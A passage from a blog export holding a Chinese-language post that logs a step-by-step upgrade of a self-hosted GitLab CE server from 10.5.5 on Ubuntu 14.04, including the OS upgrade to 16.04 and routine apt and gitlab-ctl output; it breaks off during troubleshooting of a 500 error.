新特性"}],"posts":[{"title":"Gitlab升级笔记","slug":"git/gitlab升级笔记","date":"2022-01-16T11:52:36.000Z","updated":"2022-01-18T10:02:19.075Z","comments":true,"path":"git/gitlab升级笔记/","link":"","permalink":"http://yoursite.com/git/gitlab升级笔记/","excerpt":"","text":"2017年在 Ubuntu14.04 中安装 Gitlab社区版 ，自从做过一次升级至版本 10.5.5 后，直到目前没升级过，版本落后太多，而且最近暴露的日志等漏洞也波及到Gitlab，为了安全要升级一下。 在官网得知：如果想要升级到最新版本，得一个一个版本的升级，不能跨版本升级，每个版本之间有依赖，感觉好麻烦。 之前都是下载deb包安装升级的，这次尝试一下apt升级。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 4.4.0-148-generic x86_64) * Documentation: https://help.ubuntu.com/ System information as of Tue Jan 18 14:19:39 CST 2022 System load: 0.0 Memory usage: 2% Processes: 185 Usage of /: 10.7% of 116.77GB Swap usage: 0% Users logged in: 0 Graph this data and manage this system at: https://landscape.canonical.com/UA Infrastructure Extended Security Maintenance (ESM) is not enabled.5 updates can be installed immediately.4 of these updates are security updates.To see these additional updates run: apt list --upgradableEnable UA Infrastructure ESM to receive 150 additional security updates.See https://ubuntu.com/advantage or run: sudo ua statusNew release '16.04.7 LTS' available.Run 'do-release-upgrade' to upgrade to it.Your Hardware Enablement Stack (HWE) is supported until April 2019.# 下载&amp;添加公钥$ curl https://packages.gitlab.com/gpg.key 2&gt; /dev/null | sudo apt-key add - &amp;&gt;/dev/null$ vim /etc/apt/sources.list.d/gitlab-ce.list# 写入这一行，注意，不同的ubuntu版本，最后的代号不一样，trusty是ubuntu 14.04的代号deb https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu trusty main# source.list 最好切换到国内的，如清华大学的源$ apt update# 查看是否有新版本可以升级$ apt list --upgradableListing... Donegitlab-ce/trusty 11.10.8-ce.0 amd64 [upgradable from: 10.5.5-ce.0]# 升级gitlab-ce/trusty$ apt upgradeReading package lists... DoneBuilding dependency treeReading state information... DoneCalculating upgrade... DoneThe following packages were automatically installed and are no longer required: amd64-microcode linux-modules-extra-4.4.0-148-genericUse 'apt-get autoremove' to remove them.The following packages have been kept back: linux-generic-lts-xenial linux-headers-generic-lts-xenial linux-image-generic-lts-xenialThe following packages will be upgraded: gitlab-ce1 upgraded, 0 newly installed, 0 to remove and 3 not upgraded.Need to get 620 MB of archives.After this operation, 488 MB of additional disk space will be used.Do you want to continue? [Y/n] YGet:1 https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu/ trusty/main gitlab-ce amd64 11.10.8-ce.0 [620 MB]Err https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu/ trusty/main gitlab-ce amd64 11.10.8-ce.0 HttpError404E: Failed to fetch https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu/pool/trusty/main/g/gitlab-ce/gitlab-ce_11.10.8-ce.0_amd64.deb HttpError404E: Unable to fetch some archives, maybe run apt-get update or try with --fix-missing?# 遇到了404错误 查看一下这个链接，原来trusty(14)已经被删除了，但xenial(16)还在。看来得先升级到ubuntu16.04。 123# 升级到ubuntu 16.04$ do-release-upgrade# 等待下载更新（要保证有足够的磁盘空间） 升级ubuntu16.04后 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage$ apt updateHit:1 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial InReleaseHit:2 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial-updates InReleaseHit:3 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial-backports InReleaseHit:4 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial-security InReleaseReading package lists... DoneBuilding dependency treeReading state information... DoneAll packages are up to date.# 修改一下gitlab-ce源，升级的时候ubunut已经修改过来并注释了，我们只需把注释去掉$ vim /etc/apt/sources.list.d/gitlab-ce.list # 把注释去掉# 查看gitlab版本$ gitlab-rake gitlab:env:infoSystem informationSystem: Ubuntu 16.04Current User: gitUsing RVM: noRuby Version: 2.3.6p384Gem Version: 2.6.13Bundler Version:1.13.7Rake Version: 12.3.0Redis Version: 3.2.11Git Version: 2.14.3Sidekiq Version:5.0.5Go Version: unknownGitLab informationVersion: 10.5.5Revision: c7e4919Directory: /opt/gitlab/embedded/service/gitlab-railsDB Adapter: postgresqlUsing LDAP: noUsing Omniauth: noGitLab ShellVersion: 6.0.3Repository storage paths:- default: /var/opt/gitlab/git-data/repositoriesHooks: /opt/gitlab/embedded/service/gitlab-shell/hooksGit: /opt/gitlab/embedded/bin/git# 启动gitlab$ gitlab-ctl startfail: gitaly: runsv not runningfail: gitlab-monitor: runsv not runningfail: gitlab-workhorse: runsv not runningfail: logrotate: runsv not runningfail: nginx: runsv not runningfail: node-exporter: runsv not runningfail: postgres-exporter: runsv not runningfail: postgresql: runsv not runningfail: prometheus: runsv not runningfail: redis: runsv not runningfail: redis-exporter: runsv not runningfail: sidekiq: runsv not runningfail: unicorn: runsv not running# 服务都没有在跑，需要重新配置一下。$ gitlab-ctl reconfigure$ gitlab-ctl startok: run: gitlab-monitor: (pid 2991) 0sok: run: gitlab-workhorse: (pid 3004) 1sok: run: logrotate: (pid 3019) 0sok: run: nginx: (pid 3027) 0sok: run: node-exporter: (pid 3033) 1sok: run: postgres-exporter: (pid 3045) 0sok: run: postgresql: (pid 3127) 1sok: run: prometheus: (pid 3134) 0sok: run: redis: (pid 3138) 0sok: run: redis-exporter: (pid 3142) 1sok: run: sidekiq: (pid 3147) 0sok: run: unicorn: (pid 3162) 0sok: run: sidekiq: (pid 3189) 0s 访问 gitlab 正常，接下来就可以准备升级Gitlab。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384$ apt list --upgradableListing... Done# 注意：这里显示可以升级到13.12.15，但不能直接用 ‘apt upgrade’ 更新gitlab-ce/xenial 13.12.15-ce.0 amd64 [upgradable from: 10.5.5-ce.0]$ apt list --upgradable -a # 查看所有的版本Listing... Donegitlab-ce/xenial 13.12.15-ce.0 amd64 [upgradable from: 10.5.5-ce.0]gitlab-ce/xenial 13.12.12-ce.0 amd64gitlab-ce/xenial 13.12.11-ce.0 amd64gitlab-ce/xenial 13.12.10-ce.0 amd64gitlab-ce/xenial 13.12.9-ce.0 amd64gitlab-ce/xenial 13.12.8-ce.0 amd64gitlab-ce/xenial 13.12.7-ce.0 amd64gitlab-ce/xenial 13.12.6-ce.0 amd64gitlab-ce/xenial 13.12.5-ce.0 amd64gitlab-ce/xenial 13.12.4-ce.0 amd64gitlab-ce/xenial 13.12.3-ce.0 amd64gitlab-ce/xenial 13.12.2-ce.0 amd64gitlab-ce/xenial 13.12.1-ce.0 amd64gitlab-ce/xenial 13.12.0-ce.0 amd64gitlab-ce/xenial 13.11.7-ce.0 amd64gitlab-ce/xenial 13.11.6-ce.0 amd64gitlab-ce/xenial 13.11.5-ce.0 amd64gitlab-ce/xenial 13.11.4-ce.0 amd64gitlab-ce/xenial 13.11.3-ce.0 amd64gitlab-ce/xenial 13.11.2-ce.0 amd64gitlab-ce/xenial 13.11.1-ce.0 amd64gitlab-ce/xenial 13.11.0-ce.0 amd64gitlab-ce/xenial 13.10.5-ce.0 amd64gitlab-ce/xenial 13.10.4-ce.0 amd64gitlab-ce/xenial 13.10.3-ce.0 amd64gitlab-ce/xenial 13.10.2-ce.0 amd64gitlab-ce/xenial 13.10.1-ce.0 amd64gitlab-ce/xenial 13.10.0-ce.0 amd64gitlab-ce/xenial 13.9.7-ce.0 amd64gitlab-ce/xenial 13.9.6-ce.0 amd64gitlab-ce/xenial 13.9.5-ce.0 amd64gitlab-ce/xenial 13.9.4-ce.0 amd64gitlab-ce/xenial 13.9.3-ce.0 amd64gitlab-ce/xenial 13.9.2-ce.0 amd64gitlab-ce/xenial 13.9.1-ce.0 amd64gitlab-ce/xenial 13.9.0-ce.0 amd64gitlab-ce/xenial 13.8.8-ce.0 amd64gitlab-ce/xenial 13.8.7-ce.0 amd64gitlab-ce/xenial 13.8.6-ce.0 amd64gitlab-ce/xenial 13.8.5-ce.0 amd64gitlab-ce/xenial 13.8.4-ce.0 amd64gitlab-ce/xenial 13.8.3-ce.0 amd64gitlab-ce/xenial 13.8.2-ce.0 amd64gitlab-ce/xenial 13.8.1-ce.0 amd64gitlab-ce/xenial 13.8.0-ce.0 amd64gitlab-ce/xenial 13.7.9-ce.0 amd64gitlab-ce/xenial 13.7.8-ce.0 amd64gitlab-ce/xenial 13.7.7-ce.0 amd64gitlab-ce/xenial 13.7.6-ce.0 amd64gitlab-ce/xenial 13.7.5-ce.0 amd64gitlab-ce/xenial 13.7.4-ce.0 amd64gitlab-ce/xenial 13.7.3-ce.0 amd64gitlab-ce/xenial 13.7.2-ce.0 amd64gitlab-ce/xenial 13.7.1-ce.0 amd64gitlab-ce/xenial 13.7.0-ce.0 amd64gitlab-ce/xenial 13.6.7-ce.0 amd64gitlab-ce/xenial 13.6.6-ce.0 amd64gitlab-ce/xenial 13.6.5-ce.0 amd64gitlab-ce/xenial 13.6.4-ce.0 amd64gitlab-ce/xenial 13.6.3-ce.0 amd64gitlab-ce/xenial 13.6.2-ce.0 amd64gitlab-ce/xenial 13.6.1-ce.0 amd64gitlab-ce/xenial 13.6.0-ce.0 amd64gitlab-ce/xenial 13.5.7-ce.0 amd64gitlab-ce/xenial 13.5.6-ce.0 amd64gitlab-ce/xenial 13.5.5-ce.0 amd64gitlab-ce/xenial 13.5.4-ce.0 amd64gitlab-ce/xenial 13.5.3-ce.0 amd64gitlab-ce/xenial 13.5.2-ce.0 amd64gitlab-ce/xenial 13.5.1-ce.0 amd64gitlab-ce/xenial 13.5.0-ce.0 amd64gitlab-ce/xenial 13.4.7-ce.0 amd64gitlab-ce/xenial 13.4.6-ce.0 amd64gitlab-ce/xenial 13.4.5-ce.0 amd64gitlab-ce/xenial 13.4.4-ce.0 amd64gitlab-ce/xenial 13.4.3-ce.0 amd64gitlab-ce/xenial 13.4.2-ce.0 amd64gitlab-ce/xenial 13.4.1-ce.0 amd64gitlab-ce/xenial 13.4.0-ce.0 amd64gitlab-ce/xenial 13.3.9-ce.0 amd64gitlab-ce/xenial 13.3.8-ce.0 amd64gitlab-ce/xenial 13.3.7-ce.0 amd64gitlab-ce/xenial 13.3.6-ce.0 amd64gitlab-ce/xenial 13.3.5-ce.0 amd64gitlab-ce/xenial 13.3.4-ce.0 amd64gitlab-ce/xenial 13.3.3-ce.0 amd64gitlab-ce/xenial 13.3.2-ce.0 amd64gitlab-ce/xenial 13.3.1-ce.0 amd64gitlab-ce/xenial 13.3.0-ce.1 amd64gitlab-ce/xenial 13.2.10-ce.0 amd64gitlab-ce/xenial 13.2.9-ce.0 amd64gitlab-ce/xenial 13.2.8-ce.0 amd64gitlab-ce/xenial 13.2.7-ce.0 amd64gitlab-ce/xenial 13.2.6-ce.0 amd64gitlab-ce/xenial 13.2.5-ce.0 amd64gitlab-ce/xenial 13.2.4-ce.0 amd64gitlab-ce/xenial 13.2.3-ce.0 amd64gitlab-ce/xenial 13.2.2-ce.0 amd64gitlab-ce/xenial 13.2.1-ce.0 amd64gitlab-ce/xenial 13.2.0-ce.0 amd64gitlab-ce/xenial 13.1.11-ce.0 amd64gitlab-ce/xenial 13.1.10-ce.0 amd64gitlab-ce/xenial 13.1.9-ce.0 amd64gitlab-ce/xenial 13.1.8-ce.0 amd64gitlab-ce/xenial 13.1.7-ce.0 amd64gitlab-ce/xenial 13.1.6-ce.0 amd64gitlab-ce/xenial 13.1.5-ce.0 amd64gitlab-ce/xenial 13.1.4-ce.0 amd64gitlab-ce/xenial 13.1.3-ce.0 amd64gitlab-ce/xenial 13.1.2-ce.0 amd64gitlab-ce/xenial 13.1.1-ce.0 amd64gitlab-ce/xenial 13.1.0-ce.0 amd64gitlab-ce/xenial 13.0.14-ce.0 amd64gitlab-ce/xenial 13.0.13-ce.0 amd64gitlab-ce/xenial 13.0.12-ce.0 amd64gitlab-ce/xenial 13.0.10-ce.0 amd64gitlab-ce/xenial 13.0.9-ce.0 amd64gitlab-ce/xenial 13.0.8-ce.0 amd64gitlab-ce/xenial 13.0.7-ce.0 amd64gitlab-ce/xenial 13.0.6-ce.0 amd64gitlab-ce/xenial 13.0.5-ce.0 amd64gitlab-ce/xenial 13.0.4-ce.0 amd64gitlab-ce/xenial 13.0.3-ce.0 amd64gitlab-ce/xenial 13.0.1-ce.0 amd64gitlab-ce/xenial 13.0.0-ce.0 amd64gitlab-ce/xenial 12.10.14-ce.0 amd64gitlab-ce/xenial 12.10.13-ce.0 amd64gitlab-ce/xenial 12.10.12-ce.0 amd64gitlab-ce/xenial 12.10.11-ce.0 amd64gitlab-ce/xenial 12.10.10-ce.0 amd64gitlab-ce/xenial 12.10.9-ce.0 amd64gitlab-ce/xenial 12.10.8-ce.0 amd64gitlab-ce/xenial 12.10.7-ce.0 amd64gitlab-ce/xenial 12.10.6-ce.0 amd64gitlab-ce/xenial 12.10.5-ce.0 amd64gitlab-ce/xenial 12.10.3-ce.0 amd64gitlab-ce/xenial 12.10.2-ce.0 amd64gitlab-ce/xenial 12.10.1-ce.0 amd64gitlab-ce/xenial 12.10.0-ce.0 amd64gitlab-ce/xenial 12.9.10-ce.0 amd64gitlab-ce/xenial 12.9.9-ce.0 amd64gitlab-ce/xenial 12.9.8-ce.0 amd64gitlab-ce/xenial 12.9.7-ce.0 amd64gitlab-ce/xenial 12.9.5-ce.0 amd64gitlab-ce/xenial 12.9.4-ce.0 amd64gitlab-ce/xenial 12.9.3-ce.0 amd64gitlab-ce/xenial 12.9.2-ce.0 amd64gitlab-ce/xenial 12.9.1-ce.0 amd64gitlab-ce/xenial 12.9.0-ce.0 amd64gitlab-ce/xenial 12.8.10-ce.0 amd64gitlab-ce/xenial 12.8.9-ce.0 amd64gitlab-ce/xenial 12.8.8-ce.0 amd64gitlab-ce/xenial 12.8.7-ce.0 amd64gitlab-ce/xenial 12.8.6-ce.0 amd64gitlab-ce/xenial 12.8.5-ce.0 amd64gitlab-ce/xenial 12.8.2-ce.0 amd64gitlab-ce/xenial 12.8.1-ce.0 amd64gitlab-ce/xenial 12.8.0-ce.0 amd64gitlab-ce/xenial 12.7.9-ce.0 amd64gitlab-ce/xenial 12.7.8-ce.0 amd64gitlab-ce/xenial 12.7.7-ce.0 amd64gitlab-ce/xenial 12.7.6-ce.0 amd64gitlab-ce/xenial 12.7.5-ce.0 amd64gitlab-ce/xenial 12.7.4-ce.0 amd64gitlab-ce/xenial 12.7.2-ce.0 amd64gitlab-ce/xenial 12.7.0-ce.0 amd64gitlab-ce/xenial 12.6.8-ce.0 amd64gitlab-ce/xenial 12.6.7-ce.0 amd64gitlab-ce/xenial 12.6.6-ce.0 amd64gitlab-ce/xenial 12.6.4-ce.0 amd64gitlab-ce/xenial 12.6.3-ce.0 amd64gitlab-ce/xenial 12.6.2-ce.0 amd64gitlab-ce/xenial 12.6.1-ce.0 amd64gitlab-ce/xenial 12.6.0-ce.0 amd64gitlab-ce/xenial 12.5.10-ce.0 amd64gitlab-ce/xenial 12.5.9-ce.0 amd64gitlab-ce/xenial 12.5.7-ce.0 amd64gitlab-ce/xenial 12.5.6-ce.0 amd64gitlab-ce/xenial 12.5.5-ce.0 amd64gitlab-ce/xenial 12.5.4-ce.0 amd64gitlab-ce/xenial 12.5.3-ce.0 amd64gitlab-ce/xenial 12.5.2-ce.0 amd64gitlab-ce/xenial 12.5.1-ce.0 amd64gitlab-ce/xenial 12.5.0-ce.0 amd64gitlab-ce/xenial 12.4.8-ce.0 amd64gitlab-ce/xenial 12.4.7-ce.0 amd64gitlab-ce/xenial 12.4.6-ce.0 amd64gitlab-ce/xenial 12.4.5-ce.0 amd64gitlab-ce/xenial 12.4.4-ce.0 amd64gitlab-ce/xenial 12.4.3-ce.0 amd64gitlab-ce/xenial 12.4.2-ce.0 amd64gitlab-ce/xenial 12.4.1-ce.0 amd64gitlab-ce/xenial 12.4.0-ce.0 amd64gitlab-ce/xenial 12.3.9-ce.0 amd64gitlab-ce/xenial 12.3.8-ce.0 amd64gitlab-ce/xenial 12.3.7-ce.0 amd64gitlab-ce/xenial 12.3.6-ce.0 amd64gitlab-ce/xenial 12.3.5-ce.0 amd64gitlab-ce/xenial 12.3.4-ce.0 amd64gitlab-ce/xenial 12.3.3-ce.0 amd64gitlab-ce/xenial 12.3.2-ce.0 amd64gitlab-ce/xenial 12.3.1-ce.0 amd64gitlab-ce/xenial 12.3.0-ce.0 amd64gitlab-ce/xenial 12.2.12-ce.0 amd64gitlab-ce/xenial 12.2.9-ce.0 amd64gitlab-ce/xenial 12.2.8-ce.0 amd64gitlab-ce/xenial 12.2.7-ce.0 amd64gitlab-ce/xenial 12.2.6-ce.0 amd64gitlab-ce/xenial 12.2.5-ce.0 amd64gitlab-ce/xenial 12.2.4-ce.0 amd64gitlab-ce/xenial 12.2.3-ce.0 amd64gitlab-ce/xenial 12.2.1-ce.0 amd64gitlab-ce/xenial 12.2.0-ce.0 amd64gitlab-ce/xenial 12.1.17-ce.0 amd64gitlab-ce/xenial 12.1.14-ce.0 amd64gitlab-ce/xenial 12.1.13-ce.0 amd64gitlab-ce/xenial 12.1.12-ce.0 amd64gitlab-ce/xenial 12.1.11-ce.0 amd64gitlab-ce/xenial 12.1.9-ce.0 amd64gitlab-ce/xenial 12.1.8-ce.0 amd64gitlab-ce/xenial 12.1.6-ce.0 amd64gitlab-ce/xenial 12.1.4-ce.0 amd64gitlab-ce/xenial 12.1.3-ce.0 amd64gitlab-ce/xenial 12.1.2-ce.0 amd64gitlab-ce/xenial 12.1.1-ce.0 amd64gitlab-ce/xenial 12.1.0-ce.0 amd64gitlab-ce/xenial 12.0.12-ce.0 amd64gitlab-ce/xenial 12.0.9-ce.0 amd64gitlab-ce/xenial 12.0.8-ce.0 amd64gitlab-ce/xenial 12.0.6-ce.0 amd64gitlab-ce/xenial 12.0.4-ce.0 amd64gitlab-ce/xenial 12.0.3-ce.0 amd64gitlab-ce/xenial 12.0.2-ce.0 amd64gitlab-ce/xenial 12.0.1-ce.0 amd64gitlab-ce/xenial 12.0.0-ce.0 amd64gitlab-ce/xenial 11.11.8-ce.0 amd64gitlab-ce/xenial 11.11.7-ce.0 amd64gitlab-ce/xenial 11.11.5-ce.0 amd64gitlab-ce/xenial 11.11.4-ce.0 amd64gitlab-ce/xenial 11.11.3-ce.0 amd64gitlab-ce/xenial 11.11.2-ce.0 amd64gitlab-ce/xenial 11.11.1-ce.0 amd64gitlab-ce/xenial 11.11.0-ce.0 amd64gitlab-ce/xenial 11.10.8-ce.0 amd64gitlab-ce/xenial 11.10.7-ce.0 amd64gitlab-ce/xenial 11.10.6-ce.0 amd64gitlab-ce/xenial 11.10.5-ce.0 amd64gitlab-ce/xenial 11.10.4-ce.0 amd64gitlab-ce/xenial 11.10.3-ce.0 amd64gitlab-ce/xenial 11.10.2-ce.0 amd64gitlab-ce/xenial 11.10.1-ce.0 amd64gitlab-ce/xenial 11.10.0-ce.0 amd64gitlab-ce/xenial 11.9.12-ce.0 amd64gitlab-ce/xenial 11.9.11-ce.0 amd64gitlab-ce/xenial 11.9.10-ce.0 amd64gitlab-ce/xenial 11.9.9-ce.0 amd64gitlab-ce/xenial 11.9.8-ce.0 amd64gitlab-ce/xenial 11.9.7-ce.0 amd64gitlab-ce/xenial 11.9.6-ce.0 amd64gitlab-ce/xenial 11.9.4-ce.0 amd64gitlab-ce/xenial 11.9.1-ce.0 amd64gitlab-ce/xenial 11.9.0-ce.0 amd64gitlab-ce/xenial 11.8.10-ce.0 amd64gitlab-ce/xenial 11.8.9-ce.0 amd64gitlab-ce/xenial 11.8.8-ce.0 amd64gitlab-ce/xenial 11.8.7-ce.0 amd64gitlab-ce/xenial 11.8.6-ce.0 amd64gitlab-ce/xenial 11.8.3-ce.0 amd64gitlab-ce/xenial 11.8.2-ce.0 amd64gitlab-ce/xenial 11.8.1-ce.0 amd64gitlab-ce/xenial 11.8.0-ce.0 amd64gitlab-ce/xenial 11.7.12-ce.0 amd64gitlab-ce/xenial 11.7.11-ce.0 amd64gitlab-ce/xenial 11.7.10-ce.0 amd64gitlab-ce/xenial 11.7.7-ce.0 amd64gitlab-ce/xenial 11.7.6-ce.0 amd64gitlab-ce/xenial 11.7.5-ce.0 amd64gitlab-ce/xenial 11.7.4-ce.0 amd64gitlab-ce/xenial 11.7.3-ce.0 amd64gitlab-ce/xenial 11.7.0-ce.0 amd64gitlab-ce/xenial 11.6.11-ce.0 amd64gitlab-ce/xenial 11.6.10-ce.0 amd64gitlab-ce/xenial 11.6.9-ce.0 amd64gitlab-ce/xenial 11.6.8-ce.0 amd64gitlab-ce/xenial 11.6.5-ce.0 amd64gitlab-ce/xenial 11.6.4-ce.0 amd64gitlab-ce/xenial 11.6.3-ce.0 amd64gitlab-ce/xenial 11.6.2-ce.0 amd64gitlab-ce/xenial 11.6.1-ce.0 amd64gitlab-ce/xenial 11.6.0-ce.0 amd64gitlab-ce/xenial 11.5.11-ce.0 amd64gitlab-ce/xenial 11.5.10-ce.0 amd64gitlab-ce/xenial 11.5.7-ce.0 amd64gitlab-ce/xenial 11.5.6-ce.0 amd64gitlab-ce/xenial 11.5.5-ce.0 amd64gitlab-ce/xenial 11.5.4-ce.0 amd64gitlab-ce/xenial 11.5.3-ce.0 amd64gitlab-ce/xenial 11.5.2-ce.0 amd64gitlab-ce/xenial 11.5.1-ce.0 amd64gitlab-ce/xenial 11.5.0-ce.0 amd64gitlab-ce/xenial 11.4.14-ce.0 amd64gitlab-ce/xenial 11.4.13-ce.0 amd64gitlab-ce/xenial 11.4.12-ce.0 amd64gitlab-ce/xenial 11.4.11-ce.0 amd64gitlab-ce/xenial 11.4.10-ce.0 amd64gitlab-ce/xenial 11.4.9-ce.0 amd64gitlab-ce/xenial 11.4.8-ce.0 amd64gitlab-ce/xenial 11.4.7-ce.0 amd64gitlab-ce/xenial 11.4.6-ce.0 amd64gitlab-ce/xenial 11.4.5-ce.0 amd64gitlab-ce/xenial 11.4.4-ce.0 amd64gitlab-ce/xenial 11.4.3-ce.0 amd64gitlab-ce/xenial 11.4.0-ce.0 amd64gitlab-ce/xenial 11.3.14-ce.0 amd64gitlab-ce/xenial 11.3.13-ce.0 amd64gitlab-ce/xenial 11.3.12-ce.0 amd64gitlab-ce/xenial 11.3.11-ce.0 amd64gitlab-ce/xenial 11.3.10-ce.0 amd64gitlab-ce/xenial 11.3.9-ce.0 amd64gitlab-ce/xenial 11.3.8-ce.0 amd64gitlab-ce/xenial 11.3.6-ce.0 amd64gitlab-ce/xenial 11.3.5-ce.0 amd64gitlab-ce/xenial 11.3.4-ce.0 amd64gitlab-ce/xenial 11.3.3-ce.0 amd64gitlab-ce/xenial 11.3.1-ce.0 amd64gitlab-ce/xenial 11.3.0-ce.0 amd64gitlab-ce/xenial 11.2.8-ce.0 amd64gitlab-ce/xenial 11.2.7-ce.0 amd64gitlab-ce/xenial 11.2.5-ce.0 amd64gitlab-ce/xenial 11.2.4-ce.0 amd64gitlab-ce/xenial 11.2.3-ce.0 amd64gitlab-ce/xenial 11.2.2-ce.0 amd64gitlab-ce/xenial 11.2.1-ce.0 amd64gitlab-ce/xenial 11.2.0-ce.0 amd64gitlab-ce/xenial 11.1.8-ce.0 amd64gitlab-ce/xenial 11.1.7-ce.0 amd64gitlab-ce/xenial 11.1.6-ce.0 amd64gitlab-ce/xenial 11.1.4-ce.0 amd64gitlab-ce/xenial 11.1.2-ce.0 amd64gitlab-ce/xenial 11.1.1-ce.0 amd64gitlab-ce/xenial 11.1.0-ce.0 amd64gitlab-ce/xenial 11.0.6-ce.0 amd64gitlab-ce/xenial 11.0.5-ce.0 amd64gitlab-ce/xenial 11.0.4-ce.0 amd64gitlab-ce/xenial 11.0.3-ce.0 amd64gitlab-ce/xenial 11.0.2-ce.0 amd64gitlab-ce/xenial 11.0.1-ce.0 amd64gitlab-ce/xenial 11.0.0-ce.0 amd64gitlab-ce/xenial 10.8.7-ce.0 amd64gitlab-ce/xenial 10.8.6-ce.0 amd64gitlab-ce/xenial 10.8.5-ce.0 amd64gitlab-ce/xenial 10.8.4-ce.0 amd64gitlab-ce/xenial 10.8.3-ce.0 amd64gitlab-ce/xenial 10.8.2-ce.0 amd64gitlab-ce/xenial 10.8.1-ce.0 amd64gitlab-ce/xenial 10.8.0-ce.0 amd64gitlab-ce/xenial 10.7.7-ce.0 amd64gitlab-ce/xenial 10.7.6-ce.0 amd64gitlab-ce/xenial 10.7.5-ce.0 amd64gitlab-ce/xenial 10.7.4-ce.0 amd64gitlab-ce/xenial 10.7.3-ce.0 amd64gitlab-ce/xenial 10.7.2-ce.0 amd64gitlab-ce/xenial 10.7.1-ce.0 amd64gitlab-ce/xenial,xenial 10.7.0-ce.0 amd64gitlab-ce/xenial 10.6.6-ce.0 amd64gitlab-ce/xenial 10.6.5-ce.0 amd64gitlab-ce/xenial 10.6.4-ce.0 amd64gitlab-ce/xenial 10.6.3-ce.0 amd64gitlab-ce/xenial 10.6.2-ce.0 amd64gitlab-ce/xenial 10.6.1-ce.0 amd64gitlab-ce/xenial 10.6.0-ce.0 amd64gitlab-ce/xenial 10.5.8-ce.0 amd64gitlab-ce/xenial 10.5.7-ce.0 amd64gitlab-ce/xenial 10.5.6-ce.0 amd64gitlab-ce/xenial 10.5.5-ce.0 amd64gitlab-ce/now 10.5.5-ce.0 amd64 [installed,upgradable to: 13.12.15-ce.0]... 查看【支持的升级路径】： 应该是各个版本的数据库不一致 参考路径 10.4.5 -&gt; 10.8.7 -&gt; 11.11.8 -&gt; 12.0.12 -&gt; 12.1.17 -&gt; 12.9.5 ，决定先从 10.5.5 升级到 10.8.7 版本。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697$ apt list --upgradable -a |grep 10.8.7gitlab-ce/xenial 10.8.7-ce.0 amd64# 安装指定版本$ apt install gitlab-ce=10.8.7-ce.0Reading package lists... DoneBuilding dependency treeReading state information... DoneThe following packages were automatically installed and are no longer required: linux-headers-4.4.0-31 linux-headers-4.4.0-31-generic linux-image-4.4.0-31-generic linux-image-extra-4.4.0-31-genericUse 'apt autoremove' to remove them.The following packages will be upgraded: gitlab-ce1 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.Need to get 425 MB of archives.After this operation, 115 MB of additional disk space will be used.Get:1 https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu xenial/main amd64 gitlab-ce amd64 10.8.7-ce.0 [425 MB]Fetched 425 MB in 3min 47s (1,867 kB/s)(Reading database ... 225666 files and directories currently installed.)Preparing to unpack .../gitlab-ce_10.8.7-ce.0_amd64.deb ...Unpacking gitlab-ce (10.8.7-ce.0) over (10.5.5-ce.0) ...Setting up gitlab-ce (10.8.7-ce.0) ...Checking PostgreSQL executables:Starting Chef Client, version 13.6.4resolving cookbooks for run list: [\"gitlab::config\", \"postgresql::bin\"]Synchronizing Cookbooks: - postgresql (0.1.0) - gitlab (0.0.1) - consul (0.0.0) - package (0.1.0) - registry (0.1.0) - mattermost (0.1.0) - letsencrypt (0.1.0) - gitaly (0.1.0) - runit (0.14.2) - nginx (0.1.0) - acme (3.1.0) - crond (0.1.0) - compat_resource (12.19.0)Installing Cookbook Gems:Compiling Cookbooks...Converging 1 resourcesRecipe: postgresql::bin * ruby_block[Link postgresql bin files to the correct version] action run (skipped due to only_if)Running handlers:Running handlers completeChef Client finished, 0/1 resources updated in 03 secondsChecking PostgreSQL executables: OKFound /etc/gitlab/skip-auto-migrations, exiting... _______ __ __ __ / ____(_) /_/ / ____ _/ /_ / / __/ / __/ / / __ `/ __ \\ / /_/ / / /_/ /___/ /_/ / /_/ / \\____/_/\\__/_____/\\__,_/_.___/Upgrade complete! If your GitLab server is misbehaving try running sudo gitlab-ctl restartbefore anything else.If you need to roll back to the previous version you can use the databasebackup made during the upgrade (scroll up for the filename).$ gitlab-rake gitlab:env:infoSystem informationSystem: Ubuntu 16.04Current User: gitUsing RVM: noRuby Version: 2.3.7p456Gem Version: 2.6.14Bundler Version:1.13.7Rake Version: 12.3.1Redis Version: 3.2.11Git Version: 2.16.4Sidekiq Version:5.0.5Go Version: unknownGitLab informationVersion: 10.8.7Revision: eb600b0Directory: /opt/gitlab/embedded/service/gitlab-railsDB Adapter: postgresqlUsing LDAP: noUsing Omniauth: noGitLab ShellVersion: 7.1.2Repository storage paths:- default: /var/opt/gitlab/git-data/repositoriesHooks: /opt/gitlab/embedded/service/gitlab-shell/hooksGit: /opt/gitlab/embedded/bin/git 升级完成，但访问 Gitlab Web 出现500错误12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# 尝试修复$ gitlab-ctl restart$ gitlab-ctl restart sidekiq$ gitlab-ctl hup unicorn# 